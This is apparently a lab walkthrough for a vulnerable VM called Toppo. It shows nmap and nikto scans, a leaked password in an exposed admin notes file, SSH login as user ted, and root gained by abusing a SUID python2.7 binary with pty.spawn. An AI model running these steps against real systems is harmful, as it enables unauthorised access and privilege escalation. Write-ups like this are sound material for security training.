Toppo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content discovery - username guessing from password
[+] Privilege Escalation abusing SUID file - python2.7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.108
Host is up (0.00024s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          56939/tcp  status
|_  100024  1          57886/udp  status
MAC Address: 08:00:27:5C:66:4D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Nikto Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nikto -h http://192.168.56.108
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.108
+ Target Hostname:    192.168.56.108
+ Target Port:        80
+ Start Time:         2019-11-05 07:48:40 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3268: /admin/: Directory indexing found.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2019-11-05 07:49:02 (GMT-5) (22 seconds)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting the password and username

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl http://192.168.56.108/admin/notes.txt
Note to myself :

I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Username : ted
Password : 12345ted123

Logging in as user ted

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh ted@192.168.56.108
ted@192.168.56.108's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov  5 07:26:34 2019 from 192.168.56.101
ted@Toppo:~$ id;whoami
uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
ted

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ted@Toppo:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/sbin/exim4
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/python2.7
/usr/bin/chsh
/usr/bin/at
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/procmail
/usr/bin/passwd
/bin/su
/bin/umount
/bin/mount


ted@Toppo:~$ python2.7 -c 'import pty;pty.spawn("/bin/sh");'
# id
uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
# whoami
root

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

